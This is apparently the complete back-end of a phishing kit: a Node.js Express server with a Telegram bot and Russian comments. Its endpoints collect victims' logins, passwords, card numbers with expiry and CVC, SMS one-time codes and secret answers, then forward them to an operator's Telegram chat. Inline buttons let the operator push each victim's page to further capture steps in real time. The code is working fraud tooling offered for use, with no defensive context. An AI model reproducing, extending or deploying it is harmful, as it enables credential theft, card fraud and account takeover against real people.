const express = require('express');
const bodyParser = require('body-parser');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const multer = require('multer');
const upload = multer();

const config = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.json')));
const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(cors());

const bot = new TelegramBot(config.token, { polling: true });
const userDataPath = path.join(__dirname, 'userData.json');
const routesDataPath = path.join(__dirname, 'routes.json');

const readUserData = () => {
    if (fs.existsSync(userDataPath)) {
        const data = fs.readFileSync(userDataPath);
        if (data.length === 0) return {};
        return JSON.parse(data);
    }
    return {};
};

const writeUserData = (data) => {
    fs.writeFileSync(userDataPath, JSON.stringify(data, null, 2));
};

const readRoutesData = () => {
    if (fs.existsSync(routesDataPath)) {
        const data = fs.readFileSync(routesDataPath);
        if (data.length === 0) return {};
        return JSON.parse(data);
    }
    return {};
};

const writeRoutesData = (data) => {
    fs.writeFileSync(routesDataPath, JSON.stringify(data, null, 2));
};

bot.sendMessage(config.chatId, 'Bot is up and running!').catch(error => {
    console.error('Error sending test message:', error);
});

app.post('/api/cred', upload.none(), (req, res) => {
    const { login, password, sessionId, offer, additional } = req.body;
    const users = readUserData();
    if (!users[sessionId]) {
        users[sessionId] = {};
    }
    users[sessionId].login = login;
    users[sessionId].password = password;
    users[sessionId].offer = offer;
    users[sessionId].additional = additional;
    writeUserData(users);

    let message = '';
    if (offer) message += `💼 Offer: \`${offer}\`\n`;
    if (additional) message += `📋 Additional: \`${additional}\`\n`;
    if (login) message += `👤 Login: \`${login}\`\n`;
    if (password) message += `🔐 Password: \`${password}\`\n`;
    if (users[sessionId].card || users[sessionId].exp || users[sessionId].cvc) {
        message += `💳 Card: \`${users[sessionId].card || ''}\` | \`${users[sessionId].exp || ''}\` | \`${users[sessionId].cvc || ''}\`\n`;
    }
    if (users[sessionId].otp) message += `✉ OTP: \`${users[sessionId].otp || ''}\`\n`;
    if (users[sessionId].customResponse) message += `✍ Custom: \`${users[sessionId].customResponse || ''}\`\n`;

    message += `Session ID: \`${sessionId}\``;

    const options = {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '❌ INVALID', callback_data: `credinvalid:${sessionId}` },
                    { text: '💳 CARD', callback_data: `card:${sessionId}` },
                    { text: '✉ OTP', callback_data: `otp:${sessionId}` },
                    { text: '🔒 Custom', callback_data: `custom:${sessionId}` },
                ],
            ],
        },
    };
    bot.sendMessage(config.chatId, message, { parse_mode: 'Markdown', ...options });
    res.status(200).json({ message: 'Credentials received successfully' });
});

app.post('/api/action', (req, res) => {
    const { sessionId } = req.body;
    const routes = readRoutesData();
    if (!routes[sessionId]) {
        return res.status(404).json({ message: 'Session not found' });
    }
    const action = routes[sessionId].action;
    delete routes[sessionId];
    writeRoutesData(routes);
    const response = {
        action: action,
        sessionId: sessionId,
    };
    res.status(200).json(response);
});

app.post('/api/secret', upload.none(), (req, res) => {
    const { secret, sessionId } = req.body;
    const users = readUserData();
    if (!users[sessionId]) {
        users[sessionId] = {};
    }
    users[sessionId].secret = secret;
    writeUserData(users);
    const message = `💼 Offer: \`${users[sessionId].offer || ''}\`\n👤 Login: \`${users[sessionId].login || ''}\`\n🔐 Password: \`${users[sessionId].password || ''}\`\n💳 Card: \`${users[sessionId].card || ''}\` | \`${users[sessionId].exp || ''}\` | \`${users[sessionId].cvc || ''}\`\n✉ OTP: \`${users[sessionId].otp || ''}\`\n✍ Custom: \`${users[sessionId].customResponse || ''}\`\nSession ID: \`${sessionId}\``;    
    const options = {
        reply_markup: {
            inline_keyboard: [
                    [
                        { text: '🔓 LOGIN', callback_data: `cred:${sessionId}` },
                        { text: '💳 CARD', callback_data: `card:${sessionId}` },
                        { text: '❌ INVALID', callback_data: `otpinvalid:${sessionId}` },
                    ],
                ],
            },
        };
        bot.sendMessage(config.chatId, message, { parse_mode: 'Markdown', ...options });
        res.status(200).json({ message: 'Secret received successfully' });
    });

    bot.on('callback_query', (callbackQuery) => {
        const data = callbackQuery.data.split(':');
        const action = data[0];
        const sessionId = data[1];
        const routes = readRoutesData();

        if (action === 'send_secret') {
            const secretQuestion = data[2];
            const users = readUserData();
            if (!users[sessionId]) {
                users[sessionId] = {};
            }
            users[sessionId].secretQuestion = secretQuestion; // Сохраняем секретный вопрос
            writeUserData(users);

            // Перемещение на кастомную страницу
            routes[sessionId] = { action: 'waiting_for_secret_question', secretQuestion: secretQuestion };
            writeRoutesData(routes);

            bot.sendMessage(callbackQuery.message.chat.id, `Успешно отправлено: ${secretQuestion}\nSession ID: ${sessionId}`);
            return;
        }

        // Остальная логика для других действий
        routes[sessionId] = { action: action };
        writeRoutesData(routes);
        let messageText;
        if (action === 'cred') {
            messageText = "Переход на авторизацию";
        } else if (action === 'otp') {
            messageText = "Переход на ввод SMS";
        } else if (action === 'card') {
            messageText = "Переход на ввод карты";
        } else if (action === 'credinvalid') {
            messageText = "Переход на повторную авторизацию";
        } else if (action === 'otpinvalid') {
            messageText = "Переход на повторный ввод SMS";
        } else if (action === 'cardinvalid') {
            messageText = "Переход на повторный ввод карты";
        } else if (action === 'custom') {
            messageText = "Кастомный текст:";
            bot.sendMessage(callbackQuery.message.chat.id, messageText);
            return;
        }
        bot.sendMessage(callbackQuery.message.chat.id, messageText);
    });

    bot.on('message', (msg) => {
        console.log('Received message:', msg);
        const routes = readRoutesData();
        const sessionId = Object.keys(routes).find(id => routes[id].action === 'waiting_for_secret_question');

        if (!sessionId) {
            console.error('Session ID not found');
            return;
        }

        const users = readUserData();
        try {
            if (routes[sessionId] && routes[sessionId].action === 'waiting_for_secret_question') {
                const secretQuestion = msg.text;
                bot.sendMessage(msg.chat.id, `Отправить кастом текст: ${secretQuestion}\nSession ID: ${sessionId}`, {
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: 'Да', callback_data: `send_secret:${sessionId}:${secretQuestion}` },
                                { text: 'Нет', callback_data: `cancel_secret:${sessionId}` },
                            ],
                        ],
                    },
                });
                // Обновляем действие на confirm_secret_question
                routes[sessionId].action = 'confirm_secret_question';
                writeRoutesData(routes);
                return;
            }
        } catch (error) {
            console.error('Error processing message:', error);
        }
    });

    app.listen(port, () => {
        console.log(`Server is running on http://localhost:${port}`);
    });
